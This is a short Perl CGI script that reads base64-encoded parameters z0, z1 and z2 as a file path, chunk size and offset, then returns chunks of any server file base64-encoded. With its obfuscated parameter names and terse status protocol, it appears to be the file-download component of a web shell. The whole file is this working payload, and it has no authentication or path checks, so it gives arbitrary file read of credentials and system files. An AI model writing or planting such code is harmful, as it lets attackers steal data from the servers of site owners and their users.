use warnings;
use CGI;
use MIME::Base64;

sub main {
    my $q = CGI->new;
    my $z0 = $q->param('z0') // '';
    my $z1 = $q->param('z1') // '';
    my $z2 = $q->param('z2') // '';

    my $sz_path       = decode_base64($z0);
    my $sz_chunk_size = decode_base64($z1);
    my $sz_offset     = decode_base64($z2);

    my $n_chunk_size = int($sz_chunk_size);
    my $n_offset     = int($sz_offset);

    if (!-e $sz_path) {
        die "0|ERROR://${sz_path} not existed!";
    }

    my $n_file_size = -s $sz_path;

    if ($n_offset >= $n_file_size) {
        print "2|";
        return;
    }

    my $handle;
    unless (open($handle, '<', $sz_path)) {
        die "0|ERROR://Cannot open: ${sz_path}";
    }
    binmode($handle);

    if (seek($handle, $n_offset, 0) != 1) {
        close($handle);
        die "0|ERROR://Cannot seek to: ${n_offset}";
    }

    my $remaining = $n_file_size - $n_offset;
    my $read_size = ($n_chunk_size < $remaining) ? $n_chunk_size : $remaining;

    my $data = '';
    my $read_total = 0;

    while ($read_total < $read_size) {
        my $buffer;
        my $to_read = $read_size - $read_total;
        
        my $bytes_read = read($handle, $buffer, $to_read);

        if (!defined $bytes_read) {
            close($handle);
            die "0|ERROR://Read failed";
        }

        if ($bytes_read == 0) {
            last;
        }

        $data .= $buffer;
        $read_total += $bytes_read;
    }

    close($handle);

    print "1|" . encode_base64($data, '');
}

main();